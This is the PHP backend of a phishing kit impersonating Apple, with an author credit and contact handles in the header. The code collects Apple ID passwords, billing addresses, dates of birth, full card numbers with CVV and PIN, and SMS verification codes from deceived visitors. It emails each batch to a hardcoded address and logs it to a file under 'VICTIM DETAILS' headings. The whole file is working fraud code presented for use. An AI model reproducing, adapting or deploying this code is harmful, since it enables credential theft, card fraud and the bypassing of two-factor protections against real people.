<?php

/**
 * @link              https://www.z0n51.com/
 * @since             14/02/2020
 * @package           APPLE
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      APPLE
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

include_once '../inc/app.php';
include_once '../vendor/autoload.php';
use Inacho\CreditCard;
$to = 'dr.hkrzlt@gmail.com';

function validate_cc_number($number = null) {
    $card = CreditCard::validCreditCard($number);
    if( $card['valid'] == false ) {
        return false;
    }
    return $card;
}

function validate_cc_cvv($number = null,$type = null) {
    if( empty($number) || empty($type) )
        return false;
    $cvv = CreditCard::validCvc($number, $type);
    return $cvv;
}

$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);
$get_user_countrycode = get_user_countrycode();

if($_SERVER['REQUEST_METHOD'] == "POST") {

    if( !empty($_POST['verbot']) ) {
        header("HTTP/1.0 404 Not Found");
        die('9awed');
    }

    if ($_POST['type'] == "login") {

        $_SESSION['apple_id']       = $_POST['apple_id'];
        $_SESSION['apple_password'] = $_POST['apple_password'];

        $subject = $_SERVER['REMOTE_ADDR'] . ' | Apple | Login';
        $message = '/-- LOG INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
        $message .= 'ID : ' . $_POST['apple_id'] . "\r\n";
        $message .= 'PASSWORD : ' . $_POST['apple_password'] . "\r\n";
        $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
        $message .= 'IP address : ' . get_user_ip() . "\r\n";
        $message .= 'Country : ' . get_user_country() . "\r\n";
        $message .= 'OS : ' . get_user_os() . "\r\n";
        $message .= 'Browser : ' . get_user_browser() . "\r\n";
        $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
        $message .= '/-- END LOG INFOS --/' . "\r\n\r\n";
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

        mail($to,$subject,$message,$headers);
        file_put_contents("../hkd.txt", $message, FILE_APPEND);
        unset($_SESSION['errors']);
        header("location: confirm_cc.php?cmd=_update&dispatch=$dispatch&locale=_$get_user_countrycode");

    }

    if ($_POST['type'] == "billing") {
        $_SESSION['full_name']     = $_POST['full_name'];
        $_SESSION['address']       = $_POST['address'];
        $_SESSION['city']          = $_POST['city'];
        $_SESSION['state']         = $_POST['state'];
        $_SESSION['postal_code']   = $_POST['postal_code'];
        $_SESSION['phone']         = $_POST['phone'];
        $_SESSION['date_of_birth'] = $_POST['date_of_birth'];

        $_SESSION['errors'] = [];

        if(validate_name($_POST['full_name']) == false) {
            $_SESSION['errors']['full_name'] = 'Please enter a valid name.';
        }

        if(empty($_POST['address'])) {
            $_SESSION['errors']['address'] = 'Please enter a valid address.';
        }

        if(empty($_POST['city'])) {
            $_SESSION['errors']['city'] = 'Please enter a valid city.';
        }

        if(empty($_POST['state'])) {
            $_SESSION['errors']['state'] = 'Please enter a valid state.';
        }

        if(empty($_POST['postal_code'])) {
            $_SESSION['errors']['postal_code'] = 'Please enter a valid postal code.';
        }

        if(validate_number($_POST['phone']) == false) {
            $_SESSION['errors']['phone'] = 'Please enter a valid phone.';
        }

        if( validate_date($_POST['date_of_birth'], 'd/m/Y') == false ) {
            $_SESSION['errors']['date_of_birth'] = 'Please enter a valid date.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | Apple | Billing Address';
            $message = '/-- BILLING ADDRESS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Full name : ' . $_POST['full_name'] . "\r\n";
            $message .= 'Address : ' . $_POST['address'] . "\r\n";
            $message .= 'City : ' . $_POST['city'] . "\r\n";
            $message .= 'State : ' . $_POST['state'] . "\r\n";
            $message .= 'Postal code : ' . $_POST['postal_code'] . "\r\n";
            $message .= 'Phone : ' . $_POST['phone'] . "\r\n";
            $message .= 'Date of birth : ' . $_POST['date_of_birth'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END BILLING ADDRESS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            mail($to,$subject,$message,$headers);
            file_put_contents("../hkd.txt", $message, FILE_APPEND);
            header("location: confirm_cc.php?cmd=_update&dispatch=$dispatch&locale=_$get_user_countrycode");

        } else {
            header("location: confirm_billing_address.php?cmd=_update&dispatch=$dispatch&locale=_$get_user_countrycode");
        }

    }

    if ($_POST['type'] == "card") {
        
        $_SESSION['cc_name'] = $_POST['cc_name'];
        $_SESSION['cc_number']       = $_POST['cc_number'];
        $_SESSION['cc_date']         = $_POST['cc_date'];
        $_SESSION['cc_cvv']          = $_POST['cc_cvv'];
        $_SESSION['cc_pin']          = $_POST['cc_pin'];

        $date_ex = explode('/',$_POST['cc_date']);

        $card_number = validate_cc_number($_POST['cc_number']);
        $card_cvv    = validate_cc_cvv($_POST['cc_cvv'],$card_number['type']);

        if( count($date_ex) > 1 ) {
            $card_date   = $validDate = CreditCard::validDate(trim($date_ex[1]), trim($date_ex[0]));
        } else {
            $card_date = false;
        }

        $_SESSION['errors'] = [];
        if(validate_name($_POST['cc_name']) == false) {
            $_SESSION['errors']['cc_name'] = 'Please enter a valid name.';
        }

        if($card_number == false) {
            $_SESSION['errors']['cc_number'] = 'Please enter a valid card number.';
        }

        if( $card_date == false ) {
            $_SESSION['errors']['cc_date'] = 'Please enter a valid expiration date.';
        }

        if( $card_cvv == false ) {
            $_SESSION['errors']['cc_cvv'] = 'Please enter a valid check digit for your card.';
        }

        if( validate_number($_POST['cc_pin'],4) == false ) {
            $_SESSION['errors']['cc_pin'] = 'Please enter a valid pin.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | Apple | Details';
            $message = '/-- ACCOUNT DETAILS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= '/-------------------- LOGIN --------------------/' . "\r\n";
            $message .= 'Apple ID : ' . $_SESSION['apple_id'] . "\r\n";
            $message .= 'Apple password : ' . $_SESSION['apple_password'] . "\r\n";
            $message .= '/-------------------- DETAILS --------------------/' . "\r\n";
            $message .= 'Full name : ' . $_SESSION['full_name'] . "\r\n";
            $message .= 'Address : ' . $_SESSION['address'] . "\r\n";
            $message .= 'City : ' . $_SESSION['city'] . "\r\n";
            $message .= 'State : ' . $_SESSION['state'] . "\r\n";
            $message .= 'Postal code : ' . $_SESSION['postal_code'] . "\r\n";
            $message .= 'Phone : ' . $_SESSION['phone'] . "\r\n";
            $message .= 'Date of birth : ' . $_SESSION['date_of_birth'] . "\r\n";
            $message .= '/-------------------- CARD --------------------/' . "\r\n";
            $message .= 'Cardholder name : ' . $_POST['cc_name'] . "\r\n";
            $message .= 'Card number : ' . $_POST['cc_number'] . "\r\n";
            $message .= 'Card date : ' . $_POST['cc_date'] . "\r\n";
            $message .= 'Card CVV : ' . $_POST['cc_cvv'] . "\r\n";
            $message .= 'Card PIN : ' . $_POST['cc_pin'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END ACCOUNT DETAILS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            mail($to,$subject,$message,$headers);
            file_put_contents("../hkd.txt", $message, FILE_APPEND);
            session_destroy();
            header("location: sms.php?cmd=_update&dispatch=$dispatch&locale=_$get_user_countrycode");

        } else {
            header("location: confirm_cc.php?cmd=_update&dispatch=$dispatch&locale=_$get_user_countrycode");
        }

    }

    if ($_POST['type'] == "sms") {

        $_SESSION['sms_code']       = $_POST['sms_code'];

        $_SESSION['errors'] = [];

        if( empty($_POST['sms_code']) ) {
            $_SESSION['errors']['sms_code'] = 'Please enter a valid SMS code.';
        }


        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | Apple | Sms';
            $message = '/-- SMS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'SMS : ' . $_POST['sms_code'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END SMS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            mail($to,$subject,$message,$headers);
            file_put_contents("../hkd.txt", $message, FILE_APPEND);
            session_destroy();
            header("location: congratulation.php?cmd=_update&dispatch=$dispatch&locale=_$get_user_countrycode");

        } else {
            header("location: sms.php?cmd=_update&dispatch=$dispatch&locale=_$get_user_countrycode");
        }

    }

}

?>